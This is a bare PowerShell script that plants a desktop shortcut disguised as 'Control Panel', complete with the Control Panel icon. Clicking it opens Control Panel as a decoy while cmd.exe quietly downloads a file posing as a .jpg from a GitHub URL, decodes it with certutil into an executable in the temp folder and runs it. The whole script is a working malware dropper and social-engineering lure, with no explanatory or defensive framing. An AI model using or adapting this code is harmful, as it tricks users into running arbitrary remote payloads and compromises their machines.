$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("c:\Users\$env:USERNAME\Desktop\Control Panel.lnk")
$link.targetpath = "C:\Windows\System32\cmd.exe"
$link.iconlocation = "C:\Windows\System32\control.exe"
$link.arguments = "/c powershell Start-Process control; Invoke-WebRequest https://raw.githubusercontent.com/halitAKAYDIN/payload/main/file.jpg -O file.jpg & certutil -decode file.jpg %temp%/file.exe & cmd.exe /c %temp%/file.exe"
$link.save()
